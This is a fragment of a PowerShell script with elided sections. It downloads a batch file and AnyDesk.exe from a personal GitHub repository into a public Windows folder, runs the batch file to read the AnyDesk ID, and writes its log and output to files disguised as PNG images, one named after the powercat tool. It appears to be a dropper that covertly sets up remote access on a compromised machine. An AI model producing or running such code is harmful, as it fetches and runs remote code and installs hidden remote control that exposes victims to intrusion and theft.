...
# Log file path
$LogPath = "C:\Access Control\ASManager\images\qws.png"
...
$anyBatUrl = "https://github.com/dayahek219/testdata/raw/refs/heads/main/anyold.bat"
$anyBatPath = "C:\Users\Public\anyold.bat"
try {
    Invoke-WebRequest -Uri $anyBatUrl -OutFile $anyBatPath -UseBasicParsing -TimeoutSec 30
    Write-Log " ANYDESK downloaded to $anyBatPath"
    

} catch {
    Write-Log " Failed to download anyBatUrl: $_"
}

$anyExeUrl = "https://github.com/dayahek219/testdata/raw/refs/heads/main/AnyDesk.exe"
$anyExePath = "C:\Users\Public\AnyDesk.exe"
try {
    Invoke-WebRequest -Uri $anyExeUrl -OutFile $anyExePath -UseBasicParsing -TimeoutSec 30
    Write-Log " ANYDESK downloaded to $anyExePath"
    

} catch {
    Write-Log " Failed to download anyExeUrl: $_"
}


Write-Log "[ANYDESK] Getting AnyDesk ID..."
cmd.exe /c $anyBatPath
Write-Log  "ANYDESK runed from $anyBatPath"
...
$outputFile = "C:\Access Control\ASManager\images\powercat.png"
